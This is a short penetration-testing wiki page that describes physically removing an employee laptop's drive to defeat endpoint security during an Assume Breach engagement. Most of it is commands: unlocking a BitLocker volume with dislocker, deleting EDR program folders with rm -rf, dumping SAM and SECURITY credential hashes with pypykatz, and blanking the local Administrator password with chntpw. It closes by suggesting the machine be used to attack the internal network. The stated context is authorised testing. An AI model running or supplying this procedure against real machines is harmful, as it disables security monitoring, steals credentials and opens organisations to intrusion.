---
description: Remove EDR and XDR via Physical Attack
---

# Physical Attack: Remove EDR

Okay, let’s assume you are on an Assume Breach engagement. The client provides you with an employee’s laptop or computer that is already standardized with endpoint security, such as EDR or XDR. You can try this approach to completely disable the EDR from the device:

1. Unplug the internal SSD or hard disk from the employee's laptop.
2. Boot into your Linux OS and treat the employee’s SSD as an external drive.
3. Then, run this command:

Check Encryption Type

```bash
lsblk /dev/xxx -o NAME,FSTYPE
```

BitLocker Encryption Decrypt

```bash
mkdir /mnt/bitlocker
mkdir /mnt/bitlocker_unlocked
dislocker -V /dev/nvme0n1p3 -- /mnt/bitlocker # assume C: drive on this location)
mount -o loop /mnt/bitlocker/dislocker-file /mnt/bitlocker_unlocked/
ls -la /mnt/bitlocker_unlocked/
```

Remove EDR

```bash
cd /mnt/bitlocker_unlocked/
rm -rf "Program Files/EDR Product"
rm -rf "Program Files(x86)/EDR Product"
```

Dump SAM

```bash
cd /mnt/bitlocker_unlocked/Windows/System32/config
pypykatz registry --sam SAM --security SECURITY SYSTEM 
```

Remove Local Admin password:

```bash
cd /mnt/bitlocker_unlocked/Windows/System32/config
chntpw -l SAM
chntpw -u Administrator SAM
```

4. Put the drive back into the employee’s laptop.
5. Boot into Windows and log in as an Administrator.
6. Promote your user account to Local Administrator.
7. If NDR (Network Detection and Response) is not implemented, you can use the device to attack the internal network. This is because the device remains connected to the internal network, but with EDR and XDR removed.
